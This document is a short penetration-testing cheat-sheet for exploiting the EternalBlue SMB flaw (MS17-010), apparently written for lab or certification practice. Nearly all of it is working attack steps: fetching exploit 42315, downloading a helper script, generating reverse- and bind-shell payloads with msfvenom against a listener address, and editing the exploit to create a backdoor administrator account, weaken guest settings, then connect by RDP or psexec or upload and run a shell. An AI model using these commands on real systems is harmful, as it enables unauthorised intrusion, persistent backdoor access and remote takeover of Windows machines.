# ETERNAL BLUE

## Get Exploit

```
searchsploit -m 42315
```

## Verify Access

```
smbclient -L \\target -N
```

If you have a share with guest access...

## Download MYSMB.py

Download to same folder as script
```
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```

## Gen Payload

Reverse
```
msfvenom LHOST=10.11.0.223 LPORT=80 -p windows/shell_reverse_tcp -f exe-service -o blue.exe
```
Bind
```
msfvenom LPORT=4444 -p windows/shell_bind_tcp -f exe-service -o svc.exe
```

## Edit Exploit

Blank user
```
USERNAME="//"
PASSWORD=""
```

Change payload to add an admin user
```
	print('Adding user hacker')
	service_exec(conn, r'cmd /c net user hacker hacked2019 /add')
	service_exec(conn, r'cmd /c net localgroup Administrators hacker /add')
	service_exec(conn, r'reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 0 /f')
```

Then rdesktop to system
```
rdesktop -g 90% -u hacker -p hacked2019 $TARGET
```

or psexec stuff
```
python /usr/share/doc/python-impacket/examples/psexec.py
```

Change payload to send a bind shell or reverse shell
```

	smb_send_file(smbConn, './svc.exe', 'C', '/svc.exe')
	#smb_send_file(smbConn, './blue.exe', 'C', '/blue.exe')
	print('File copied to c:\...')
	service_exec(conn, r'cmd.exe /c c:\\svc.exe')
```